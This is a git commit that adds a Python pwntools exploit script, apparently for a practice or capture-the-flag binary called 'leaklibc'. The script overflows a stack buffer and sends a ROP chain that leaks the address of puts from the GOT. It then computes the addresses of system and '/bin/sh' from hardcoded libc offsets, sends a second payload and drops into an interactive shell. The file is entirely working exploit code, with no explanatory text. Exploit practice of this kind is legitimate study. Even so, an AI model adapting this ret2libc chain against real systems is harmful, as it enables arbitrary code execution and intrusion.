33a4b83e3560e92b833869305a0d39d93b3adeb0
ZilchGl1tch <65584265+ZilchGl1tch@users.noreply.github.com>
2020-12-15 00:46:16 +0530

    Add files via upload

---
+++ ret2libc/leaklibc.py
@@ -0,0 +1,52 @@
+from pwn import *
+
+context.arch = "amd64"
+context.terminal = ['kitty', '-e', 'sh', '-c']
+exe = context.binary = ELF('./leaklibc')
+
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        io = gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+        io.recvline()
+        return io
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+puts_plt = 0x401030
+pop_rdi = 0x004011d3
+pop_rsi = 0x004011d1
+bss = exe.bss()+0x100
+bin_sh_offset = 0x116af8
+system_offset = -0x2cb50
+puts_got = 0x404018
+main = 0x401136
+
+payload = 'A'*0x18
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+io = start()
+io.recvline()
+io.sendline(payload)
+puts_addr = unpack(io.recvline().split('\n')[0]+'\x00\x00',64)
+print 'Puts address:'+str(hex(puts_addr))
+
+payload = 'A'*0x18
+payload += p64(pop_rdi)
+payload += p64(puts_addr+bin_sh_offset)
+payload += p64(puts_addr+system_offset)
+
+io.recvline()
+io.sendline(payload)
+io.interactive()
+
